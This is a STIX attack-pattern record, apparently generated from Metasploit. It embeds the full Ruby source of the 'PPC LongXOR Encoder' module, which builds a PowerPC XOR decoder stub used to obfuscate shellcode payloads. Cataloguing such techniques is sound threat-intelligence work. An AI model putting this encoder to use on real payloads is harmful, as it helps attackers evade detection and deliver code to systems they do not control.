{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--944b457c-e620-40d7-8344-779a8ce53e87",
    "created": "2024-08-14T16:33:19.20321Z",
    "modified": "2024-08-14T16:33:19.203213Z",
    "name": "PPC LongXOR Encoder",
    "description": " This encoder is ghandi's PPC dword xor encoder with some size tweaks by HDM. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/ppc/longxor.rb",
            "external_id": "longxor.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::Xor\n\n  def initialize\n    super(\n      'Name'             => 'PPC LongXOR Encoder',\n      'Description'      => %q{\n        This encoder is ghandi's PPC dword xor encoder with some size tweaks\n        by HDM.\n      },\n      'Author'           => [ 'ddz', 'hdm' ],\n      'Arch'             => ARCH_PPC,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'KeySize'    => 4,\n          'BlockSize'  => 4,\n          'KeyPack'    => 'N',\n        })\n  end\n\n  #\n  # Returns the decoder stub that is adjusted for the size of\n  # the buffer being encoded\n  #\n  def decoder_stub(state)\n    [\n      0x7ca52a79,     # 0x1da8 <main>:          xor.    r5,r5,r5\n      0x4082fffd,     # 0x1dac <main+4>:        bnel+   0x1da8 <main>\n      0x7fe802a6,     # 0x1db0 <main+8>:        mflr    r31\n      0x3bff07fa,     # 0x1db4 <main+12>:       addi    r31,r31,2042\n      0x38a5f84a,     # 0x1db8 <main+16>:       addi    r5,r5,-1974\n      0x3cc09999,     # 0x1dbc <main+20>:       lis     r6, hi16(key)\n      0x60c69999,     # 0x1dc0 <main+24>:       ori     r6,r6, lo16(key)\n      0x388507ba,     # 0x1dc4 <main+28>:       addi    r4,r5,1978\n      0x7c8903a6,     # 0x1dc8 <main+32>:       mtctr   r4\n      0x809ff84a,     # 0x1dcc <main+36>:       lwz     r4,-1974(r31)\n      0x7c843278,     # 0x1dd0 <main+40>:       xor     r4,r4,r6\n      0x909ff84a,     # 0x1dd4 <main+44>:       stw     r4,-1974(r31)\n      0x7c05f8ac,     # 0x1dd8 <main+48>:       dcbf    r5,r31\n      0x7cff04ac,     # 0x1ddc <main+52>:       sync\n      0x7c05ffac,     # 0x1de0 <main+56>:       icbi    r5,r31\n      0x3bc507ba,     # 0x1de4 <main+60>:       addi    r30,r5,1978\n      0x7ffff215,     # 0x1de8 <main+64>:       add.    r31,r31,r30\n      0x4220ffe0,     # 0x1dec <main+68>:       bdnz-   0x1dcc <main+36>\n      0x4cff012c,     # 0x1df0 <main+72>:       isync\n    ].pack(\"N*\")\n  end\n\n  #\n  # Fix up the decoder stub now\n  #\n  def encode_finalize_stub(state, stub)\n    icount = state.buf.length / 4\n\n    stub[30, 2] = [ 1974 + icount  ].pack('n')\n    stub[22, 2] = [ state.key.to_i ].pack('N')[0, 2]\n    stub[26, 2] = [ state.key.to_i ].pack('N')[2, 2]\n\n    stub\n  end\nend\n"
}